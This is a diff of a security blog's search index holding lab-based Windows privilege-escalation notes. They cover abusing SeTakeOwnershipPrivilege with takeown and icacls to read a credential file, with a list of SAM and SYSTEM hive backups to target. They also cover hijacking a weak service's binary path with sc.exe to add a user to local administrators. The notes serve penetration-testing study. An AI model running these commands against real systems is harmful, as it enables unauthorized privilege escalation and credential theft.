+<h4 id="Confirming-Ownership-Changed"><a href="#Confirming-Ownership-Changed" class="headerlink" title="Confirming Ownership Changed"></a>Confirming Ownership Changed</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ChildItem</span> <span class="literal">-Path</span> <span class="string">&#x27;C:\Department Shares\Private\IT\cred.txt&#x27;</span> | <span class="built_in">select</span> name,directory, <span class="selector-tag">@</span>&#123;Name=<span class="string">&quot;Owner&quot;</span>;Expression=&#123;(<span class="built_in">Get-ACL</span> <span class="variable">$_</span>.Fullname).Owner&#125;&#125;</span><br><span class="line"> </span><br><span class="line">Name            Directory                            Owner</span><br><span class="line">cred.txt        C:\Department Shares\Private\IT      WINLPE<span class="literal">-SRV01</span>\htb<span class="literal">-student</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Modifying-the-File-ACL-Grant-Ourself-full-privileges-over-the-target-file"><a href="#Modifying-the-File-ACL-Grant-Ourself-full-privileges-over-the-target-file" class="headerlink" title="Modifying the File ACL ( Grant Ourself full privileges over the target file )"></a>Modifying the File ACL ( Grant Ourself full privileges over the target file )</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; icacls <span class="string">&#x27;C:\Department Shares\Private\IT\cred.txt&#x27;</span> /grant htb<span class="literal">-student</span>:F</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>➜ Now we can () modify, read, etc ) the file.</p>
+</blockquote>
+<h4 id="Interesting-Files-To-Check"><a href="#Interesting-Files-To-Check" class="headerlink" title="Interesting Files To Check"></a>Interesting Files To Check</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\inetpub\wwwwroot\web.config</span><br><span class="line">%WINDIR%\repair\sam</span><br><span class="line">%WINDIR%\repair\system</span><br><span class="line">%WINDIR%\repair\software, %WINDIR%\repair\security</span><br><span class="line">%WINDIR%\system32\config\SecEvent.Evt</span><br><span class="line">%WINDIR%\system32\config\default.sav</span><br><span class="line">%WINDIR%\system32\config\security.sav</span><br><span class="line">%WINDIR%\system32\config\software.sav</span><br><span class="line">%WINDIR%\system32\config\system.sav</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>Active Directory</category>
         <category>Windows</category>
@@ -2854,8 +2972,8 @@
         <category>Services</category>
       </categories>
       <tags>
-        <tag>wmic</tag>
         <tag>msfvenom</tag>
+        <tag>wmic</tag>
         <tag>icacls</tag>
         <tag>Windows-Services</tag>
         <tag>Unquoted-Service-Path</tag>
@@ -2942,65 +3060,46 @@
       </tags>
   </entry>
   <entry>
-    <title>SeTakeOwnershipPrivilege</title>
-    <url>/2026/03/06/SeTakeOwnershipPrivilege/</url>
+    <title>Weak Service Permissions</title>
+    <url>/2026/06/16/Weak-Service-Permissions/</url>
     <content><![CDATA[<blockquote>
-<p>➜ SeTakeOwnershipPrivilege lets a user become the owner of any protected Windows object (files, registry keys, services, or AD objects), which enables full access through the sequence : </p>
+<p>➜ Weak Service Permissions occur when a low-privileged user has excessive permissions over a service object ( SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS), allowing them to modify the service configuration such as the binary path and execute arbitrary code as SYSTEM.</p>
 </blockquote>
-<ul>
-<li><code>Take Ownership → Modify The DACL (ACL) → Gain Full Access</code></li>
-</ul>
-<blockquote>
-<p>➜ This can lead us to : </p>
-</blockquote>
-<ol>
-<li><p>Read protected files  </p>
-<p> Take ownership → change ACL → read sensitive files (creds, keys, flags).</p>
-</li>
-<li><p>Privilege escalation &#x2F; RCE  </p>
-<p> Take ownership of a config&#x2F;script used by a privileged service → modify it → code runs as SYSTEM&#x2F;service account.</p>
-</li>
-<li><p>Denial of Service (DoS) </p>
-<p> Take ownership → break ACLs on critical files → service&#x2F;app stops working.</p>
-</li>
-<li><p>GPO → ownership abuse (domain)</p>
-<p> Abuse GPO to grant the privilege <code>SeTakeOwnershipPrivilege</code> → then do any of the above on file shares or systems.</p>
-</li>
-</ol>
-<h4 id="Enabling-SeTakeOwnershipPrivilege"><a href="#Enabling-SeTakeOwnershipPrivilege" class="headerlink" title="Enabling SeTakeOwnershipPrivilege"></a>Enabling SeTakeOwnershipPrivilege</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"></span><br><span class="line">Privilege Name                Description                                              State</span><br><span class="line">============================= ======================================================= ========</span><br><span class="line">SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled</span><br></pre></td></tr></table></figure>
+<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h4 id="Enumerates-Modifiable-Service’configuration"><a href="#Enumerates-Modifiable-Service’configuration" class="headerlink" title="Enumerates Modifiable Service’configuration"></a>Enumerates Modifiable Service’configuration</h4><p> &gt;➜ As we can see SharpUp identified that configuration of <code>WindscribeService.exe</code> is Modifiable</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\SharpUp.exe audit</span><br><span class="line"></span><br><span class="line">=== Modifiable Services ===</span><br><span class="line"></span><br><span class="line">  Name             : WindscribeService</span><br><span class="line">  DisplayName      : WindscribeService</span><br><span class="line">  Description      : Manages the firewall and controls the VPN tunnel</span><br><span class="line">  State            : Running</span><br><span class="line">  StartMode        : Auto</span><br><span class="line">  PathName         : <span class="string">&quot;C:\Program Files (x86)\Windscribe\WindscribeService.exe&quot;</span></span><br></pre></td></tr></table></figure>
 
-<blockquote>
-<p>➜ In some cases, the privilege is present but disabled by default. It can be enabled at runtime by adjusting the process token using this PowerShell <a href="https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1">script</a>.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Import-Module</span> .\<span class="built_in">Enable-Privilege</span>.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; .\EnableAllTokenPrivs.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line">Privilege Name                Description                              State</span><br><span class="line">============================= ======================================== =======</span><br><span class="line">SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled</span><br></pre></td></tr></table></figure>
+<h4 id="Checking-the-Service-Account"><a href="#Checking-the-Service-Account" class="headerlink" title="Checking the Service Account"></a>Checking the Service Account</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS C:\&gt; sc.exe qc WindscribeService  </span><br><span class="line">  </span><br><span class="line">[SC] QueryServiceConfig SUCCESS  </span><br><span class="line">  </span><br><span class="line">	SERVICE_NAME: WindscribeService  </span><br><span class="line">	TYPE : 10 WIN32_OWN_PROCESS  </span><br><span class="line">	START_TYPE : 2 AUTO_START  </span><br><span class="line">	BINARY_PATH_NAME : C:\Program Files (x86)\Windscribe\WindscribeService.exe  </span><br><span class="line">	SERVICE_START_NAME : LocalSystem</span><br></pre></td></tr></table></figure>
 
-<h4 id="Checking-File-Ownership"><a href="#Checking-File-Ownership" class="headerlink" title="Checking File Ownership"></a>Checking File Ownership</h4><p>Check out the owner of the IT directory.</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; cmd /c <span class="built_in">dir</span> /q <span class="string">&#x27;C:\Department Shares\Private\IT&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="number">06</span>/<span class="number">18</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">22</span> PM    &lt;<span class="built_in">DIR</span>&gt;          WINLPE<span class="literal">-SRV01</span>\sccm_svc  ..</span><br><span class="line"><span class="number">06</span>/<span class="number">18</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">23</span> PM                <span class="number">36</span> ...                    cred.txt</span><br></pre></td></tr></table></figure>
+<h4 id="Checking-Permissions-with-AccessChk"><a href="#Checking-Permissions-with-AccessChk" class="headerlink" title="Checking Permissions with AccessChk"></a>Checking Permissions with AccessChk</h4><p> &gt;➜ We can see that all Authenticated Users have <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights">SERVICE_ALL_ACCESS</a> rights over the service, which means full read&#x2F;write control over it.</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\accesschk.exe /accepteula <span class="literal">-quvcw</span> WindscribeService</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">WindscribeService</span><br><span class="line">  Medium Mandatory Level (Default) [<span class="type">No</span>-<span class="built_in">Write-Up</span>]</span><br><span class="line"></span><br><span class="line">  RW NT AUTHORITY\Authenticated Users</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br></pre></td></tr></table></figure>
 
 
-<blockquote>
-<p>➜  IT share appears to be owned by a service account <code>sccm_svc</code>.</p>
-</blockquote>
-<h4 id="Taking-Ownership-of-the-File"><a href="#Taking-Ownership-of-the-File" class="headerlink" title="Taking Ownership of the File"></a>Taking Ownership of the File</h4><blockquote>
-<p>➜ Now we can use the <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown">takeown</a> Windows binary to change ownership of the file.</p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; takeown /f <span class="string">&#x27;C:\Department Shares\Private\IT\cred.txt&#x27;</span></span><br></pre></td></tr></table></figure>
+<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><h4 id="Changing-the-Service-Binary-Path"><a href="#Changing-the-Service-Binary-Path" class="headerlink" title="Changing the Service Binary Path"></a>Changing the Service Binary Path</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; sc.exe config WindscribeService binpath=<span class="string">&quot;cmd /c net localgroup administrators htb-student /add&quot;</span></span><br></pre></td></tr></table></figure>
 
-<h4 id="Confirming-Ownership-Changed"><a href="#Confirming-Ownership-Changed" class="headerlink" title="Confirming Ownership Changed"></a>Confirming Ownership Changed</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ChildItem</span> <span class="literal">-Path</span> <span class="string">&#x27;C:\Department Shares\Private\IT\cred.txt&#x27;</span> | <span class="built_in">select</span> name,directory, <span class="selector-tag">@</span>&#123;Name=<span class="string">&quot;Owner&quot;</span>;Expression=&#123;(<span class="built_in">Get-ACL</span> <span class="variable">$_</span>.Fullname).Owner&#125;&#125;</span><br><span class="line"> </span><br><span class="line">Name            Directory                            Owner</span><br><span class="line">cred.txt        C:\Department Shares\Private\IT      WINLPE<span class="literal">-SRV01</span>\htb<span class="literal">-student</span></span><br></pre></td></tr></table></figure>
+<h4 id="Stop-Service"><a href="#Stop-Service" class="headerlink" title="Stop Service"></a>Stop Service</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; sc.exe stop WindscribeService</span><br></pre></td></tr></table></figure>
 
-<h4 id="Modifying-the-File-ACL-Grant-Ourself-full-privileges-over-the-target-file"><a href="#Modifying-the-File-ACL-Grant-Ourself-full-privileges-over-the-target-file" class="headerlink" title="Modifying the File ACL ( Grant Ourself full privileges over the target file )"></a>Modifying the File ACL ( Grant Ourself full privileges over the target file )</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; icacls <span class="string">&#x27;C:\Department Shares\Private\IT\cred.txt&#x27;</span> /grant htb<span class="literal">-student</span>:F</span><br></pre></td></tr></table></figure>
+<h4 id="Starte-the-Service"><a href="#Starte-the-Service" class="headerlink" title="Starte the Service"></a>Starte the Service</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; sc.exe <span class="built_in">start</span> WindscribeService</span><br></pre></td></tr></table></figure>
 
-<blockquote>
-<p>➜ Now we can () modify, read, etc ) the file.</p>
-</blockquote>
-<h4 id="Interesting-Files-To-Check"><a href="#Interesting-Files-To-Check" class="headerlink" title="Interesting Files To Check"></a>Interesting Files To Check</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\inetpub\wwwwroot\web.config</span><br><span class="line">%WINDIR%\repair\sam</span><br><span class="line">%WINDIR%\repair\system</span><br><span class="line">%WINDIR%\repair\software, %WINDIR%\repair\security</span><br><span class="line">%WINDIR%\system32\config\SecEvent.Evt</span><br><span class="line">%WINDIR%\system32\config\default.sav</span><br><span class="line">%WINDIR%\system32\config\security.sav</span><br><span class="line">%WINDIR%\system32\config\software.sav</span><br><span class="line">%WINDIR%\system32\config\system.sav</span><br></pre></td></tr></table></figure>]]></content>
+<h4 id="Check-Privilege"><a href="#Check-Privilege" class="headerlink" title="Check Privilege"></a>Check Privilege</h4><p> &gt;➜ Now we are local <code>administrator</code>.</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; net localgroup administrators</span><br><span class="line"></span><br><span class="line">Members</span><br><span class="line"><span class="literal">-------------------------------------------------------------------------------</span></span><br><span class="line">Administrator</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>Active Directory</category>
         <category>Windows</category>
         <category>Post-Exploitation</category>
         <category>Windows Privesc</category>
-        <category>User</category>
+        <category>Services</category>
       </categories>
+      <tags>
+        <tag>AccessChk</tag>
+        <tag>SharpUp</tag>
+        <tag>sc.exe</tag>
+        <tag>Windows-Services</tag>
+        <tag>Weak-Service-Permissions</tag>
+        <tag>Modifiable-Service</tag>
+        <tag>Service-Configuration</tag>
+        <tag>SERVICE_ALL_ACCESS</tag>
+        <tag>SERVICE_CHANGE_CONFIG</tag>
+      </tags>
   </entry>
   <entry>
     <title>Windows Credential Hunting</title>
@@ -3430,9 +3529,9 @@
         <category>Old Systems</category>
       </categories>
       <tags>
-        <tag>CVE</tag>
         <tag>Windows</tag>
         <tag>Privilege-Escalation</tag>
+        <tag>CVE</tag>
         <tag>Metasploit</tag>
         <tag>HiveNightmare</tag>
         <tag>SeriousSam</tag>
@@ -3501,48 +3600,6 @@
         <tag>CeWL</tag>
         <tag>Cupp</tag>
         <tag>Hashcat Rules</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Weak Service Permissions</title>
-    <url>/2026/06/16/Weak-Service-Permissions/</url>
-    <content><![CDATA[<blockquote>
-<p>➜ Weak Service Permissions occur when a low-privileged user has excessive permissions over a service object ( SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS), allowing them to modify the service configuration such as the binary path and execute arbitrary code as SYSTEM.</p>
-</blockquote>
-<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h4 id="Enumerates-Modifiable-Service’configuration"><a href="#Enumerates-Modifiable-Service’configuration" class="headerlink" title="Enumerates Modifiable Service’configuration"></a>Enumerates Modifiable Service’configuration</h4><p> &gt;➜ As we can see SharpUp identified that configuration of <code>WindscribeService.exe</code> is Modifiable</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\SharpUp.exe audit</span><br><span class="line"></span><br><span class="line">=== Modifiable Services ===</span><br><span class="line"></span><br><span class="line">  Name             : WindscribeService</span><br><span class="line">  DisplayName      : WindscribeService</span><br><span class="line">  Description      : Manages the firewall and controls the VPN tunnel</span><br><span class="line">  State            : Running</span><br><span class="line">  StartMode        : Auto</span><br><span class="line">  PathName         : <span class="string">&quot;C:\Program Files (x86)\Windscribe\WindscribeService.exe&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="Checking-the-Service-Account"><a href="#Checking-the-Service-Account" class="headerlink" title="Checking the Service Account"></a>Checking the Service Account</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS C:\&gt; sc.exe qc WindscribeService  </span><br><span class="line">  </span><br><span class="line">[SC] QueryServiceConfig SUCCESS  </span><br><span class="line">  </span><br><span class="line">	SERVICE_NAME: WindscribeService  </span><br><span class="line">	TYPE : 10 WIN32_OWN_PROCESS  </span><br><span class="line">	START_TYPE : 2 AUTO_START  </span><br><span class="line">	BINARY_PATH_NAME : C:\Program Files (x86)\Windscribe\WindscribeService.exe  </span><br><span class="line">	SERVICE_START_NAME : LocalSystem</span><br></pre></td></tr></table></figure>
-
-<h4 id="Checking-Permissions-with-AccessChk"><a href="#Checking-Permissions-with-AccessChk" class="headerlink" title="Checking Permissions with AccessChk"></a>Checking Permissions with AccessChk</h4><p> &gt;➜ We can see that all Authenticated Users have <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights">SERVICE_ALL_ACCESS</a> rights over the service, which means full read&#x2F;write control over it.</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\accesschk.exe /accepteula <span class="literal">-quvcw</span> WindscribeService</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">WindscribeService</span><br><span class="line">  Medium Mandatory Level (Default) [<span class="type">No</span>-<span class="built_in">Write-Up</span>]</span><br><span class="line"></span><br><span class="line">  RW NT AUTHORITY\Authenticated Users</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><h4 id="Changing-the-Service-Binary-Path"><a href="#Changing-the-Service-Binary-Path" class="headerlink" title="Changing the Service Binary Path"></a>Changing the Service Binary Path</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; sc.exe config WindscribeService binpath=<span class="string">&quot;cmd /c net localgroup administrators htb-student /add&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="Stop-Service"><a href="#Stop-Service" class="headerlink" title="Stop Service"></a>Stop Service</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; sc.exe stop WindscribeService</span><br></pre></td></tr></table></figure>
-
-<h4 id="Starte-the-Service"><a href="#Starte-the-Service" class="headerlink" title="Starte the Service"></a>Starte the Service</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; sc.exe <span class="built_in">start</span> WindscribeService</span><br></pre></td></tr></table></figure>
-
-<h4 id="Check-Privilege"><a href="#Check-Privilege" class="headerlink" title="Check Privilege"></a>Check Privilege</h4><p> &gt;➜ Now we are local <code>administrator</code>.</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; net localgroup administrators</span><br><span class="line"></span><br><span class="line">Members</span><br><span class="line"><span class="literal">-------------------------------------------------------------------------------</span></span><br><span class="line">Administrator</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Windows Privesc</category>
-        <category>Services</category>
-      </categories>
-      <tags>
-        <tag>AccessChk</tag>
-        <tag>SharpUp</tag>
-        <tag>sc.exe</tag>
-        <tag>Windows-Services</tag>
-        <tag>Weak-Service-Permissions</tag>
-        <tag>Modifiable-Service</tag>
-        <tag>Service-Configuration</tag>
-        <tag>SERVICE_ALL_ACCESS</tag>
-        <tag>SERVICE_CHANGE_CONFIG</tag>
       </tags>
   </entry>
 </search>
